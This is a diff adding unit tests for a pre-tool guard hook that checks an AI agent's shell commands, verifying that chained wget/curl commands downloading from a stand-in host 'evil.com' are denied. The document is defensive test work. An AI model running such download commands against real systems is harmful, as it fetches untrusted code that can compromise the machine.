@@ -2018,6 +2018,19 @@ class ArgonV25HooksTestSuite(unittest.TestCase):
         res_dd_tmp = run_hook("pre_tool_guard.py", p_rev_dd)
         self.assertEqual(res_dd_tmp["decision"], "allow")
 
+        # Compound downloads: earlier safe -O must not blind subsequent unsaved wget/curl
+        p_rev_dd["toolCall"]["args"]["CommandLine"] = "wget -O /tmp/safe.txt https://example.com && wget https://evil.com"
+        res_wget_multi = run_hook("pre_tool_guard.py", p_rev_dd)
+        self.assertEqual(res_wget_multi["decision"], "deny")
+
+        p_rev_dd["toolCall"]["args"]["CommandLine"] = "curl -o /tmp/safe.json https://api.com && curl -O https://evil.com/app.py"
+        res_curl_multi = run_hook("pre_tool_guard.py", p_rev_dd)
+        self.assertEqual(res_curl_multi["decision"], "deny")
+
+        p_rev_dd["toolCall"]["args"]["CommandLine"] = "wget -O /tmp/a.txt https://a.com && wget -O /tmp/b.txt https://b.com"
+        res_wget_safe = run_hook("pre_tool_guard.py", p_rev_dd)
+        self.assertEqual(res_wget_safe["decision"], "allow")
+
         # 2. Stop guard MUST reject unparsed wrapper no-ops as verification
         app_file = os.path.join(self.workspace_dir, "app_unparsed.py")
         p_stop = self.base_payload()
